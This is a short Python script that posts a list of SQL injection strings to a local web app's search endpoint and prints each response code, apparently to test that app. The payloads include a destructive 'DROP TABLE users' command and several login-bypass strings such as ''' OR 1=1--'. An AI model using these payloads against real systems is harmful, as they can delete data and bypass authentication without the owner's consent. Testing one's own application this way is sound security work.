import requests 

url = "http://127.0.0.1:5000/search"

sql_injections = ["'; DROP TABLE users; --", "' OR 1=1--", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1#", "' OR 1=1--", "' OR 1=1/*", "admin' --", "admin' #", "admin'/*", "' OR '1'='1' LIMIT 1 --", "' OR '1'='1' LIMIT 1#", "' OR '1'='1' LIMIT 1/*", "' OR '1'='1' ORDER BY 1 --", "' OR '1'='1' ORDER BY 1#", "' OR '1'='1' ORDER BY 1/*    "]

for injection in sql_injections:
    payload = {"query": injection}
    response = requests.post(url, data=payload)
    print(f"Payload: {injection} | Response Code: {response.status_code}")
    